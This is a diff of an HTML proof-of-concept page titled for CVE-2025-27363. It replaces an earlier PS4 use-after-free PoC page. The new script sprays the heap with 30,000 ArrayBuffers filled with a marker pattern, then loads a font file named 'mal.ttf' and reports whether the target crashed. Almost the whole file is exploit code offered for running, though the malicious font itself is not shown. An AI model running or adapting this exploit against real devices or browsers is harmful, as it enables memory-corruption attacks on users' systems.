@@ -1,17 +1,98 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>PS4 UAF PoC B</title>
+  <meta charset="utf-8" />
+  <title>CVE-2025-27363 PoC + Heap Spray</title>
   <style>
-    body { font-family: monospace; background: black; color: lime; }
-    #status { white-space: pre-wrap; margin-top: 1em; }
+    body {
+      background: #000;
+      color: #0f0;
+      font-family: monospace;
+      padding: 2em;
+      font-size: 16px;
+    }
+    .log {
+      white-space: pre-wrap;
+      background: #111;
+      padding: 1em;
+      border: 1px solid #0f0;
+      margin-top: 1em;
+    }
+    .status {
+      font-size: 24px;
+      margin-top: 1em;
+    }
+    .ok { color: lime; }
+    .fail { color: red; }
+    #glyph {
+      font-size: 120px;
+      margin-top: 1em;
+    }
   </style>
 </head>
 <body>
-  <object data="" width="0" height="0"></object>
-  <cite style="display: inline-block;"></cite>
-  <dl></dl>
-  <div id="status">PS4 DOM Exploit PoC B<br/></div>
-  <script src="./exploit.js"></script>
+  <h1>✅ CVE-2025-27363 + Heap Spray PoC</h1>
+  <button onclick="start()">Start Exploit</button>
+  <div id="glyph">%%%%%%%%%%%</div>
+  <div class="log" id="log">[+] Ready.</div>
+  <div class="status" id="status">Sin iniciar</div>
+
+  <script>
+    const logElem = document.getElementById('log');
+    const statusElem = document.getElementById('status');
+    const glyphElem = document.getElementById('glyph');
+
+    const log = msg => {
+      logElem.innerText += "\n" + msg;
+    };
+
+    const SPRAY_CNT = 30000;
+    const SPRAY_SIZE = 0x100;
+    const PATTERN = 0x43434343;
+
+    const spray = [];
+
+    function heapSpray() {
+      log("[*] Spraying heap with ArrayBuffers...");
+      for (let i = 0; i < SPRAY_CNT; i++) {
+        const buf = new ArrayBuffer(SPRAY_SIZE);
+        const u32 = new Uint32Array(buf);
+        for (let j = 0; j < u32.length; j++) u32[j] = PATTERN;
+        spray.push(buf);
+      }
+      log("[+] Heap spray complete.");
+    }
+
+    async function loadFont() {
+      log("[*] Loading malicious font...");
+      const font = new FontFace('boom', 'url("mal.ttf")');
+
+      try {
+        await font.load();
+        document.fonts.add(font);
+        glyphElem.style.fontFamily = 'boom';
+        glyphElem.style.color = 'red';
+        log("[+] Font loaded and applied.");
+        statusElem.className = 'ok';
+        statusElem.textContent = "✅ PoC triggered. If crash or glyphs show, system is vulnerable.";
+      } catch (e) {
+        log("[-] Font load failed.");
+        statusElem.className = 'fail';
+        statusElem.textContent = "❌ Font load failed. Test did not run.";
+      }
+    }
+
+    async function start() {
+      statusElem.textContent = "Running...";
+      statusElem.className = '';
+      logElem.innerText = "[*] Starting PoC...";
+      glyphElem.style.fontFamily = 'monospace';
+      glyphElem.style.color = '#0f0';
+
+      heapSpray();
+      await new Promise(r => setTimeout(r, 500)); // Small delay for heap settling
+      await loadFont();
+    }
+  </script>
 </body>
 </html>
